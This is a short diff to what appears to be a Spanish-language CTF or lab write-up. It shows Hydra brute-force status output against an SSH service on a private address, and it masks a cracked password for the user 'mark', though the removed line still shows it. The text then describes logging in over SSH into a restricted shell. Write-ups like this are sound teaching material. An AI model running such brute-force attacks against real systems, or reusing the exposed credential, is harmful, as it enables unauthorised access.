@@ -74,7 +74,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-16 18:58:
 [STATUS] 28.00 tries/min, 84 tries in 00:03h, 28688714 to do in 17076:37h, 4 active
 [STATUS] 26.29 tries/min, 184 tries in 00:07h, 28688614 to do in 18190:15h, 4 active
 [STATUS] 25.60 tries/min, 384 tries in 00:15h, 28688414 to do in 18677:22h, 4 active
-[22][ssh] host: 192.168.0.45   login: mark   password: genesis
+[22][ssh] host: 192.168.0.45   login: mark   password: *******
 ```
 
 Nos conectamos por SSH con las credenciales de Mark, pero estamos bajo una shell restringida, no nos permite ejecutar ningún comando:
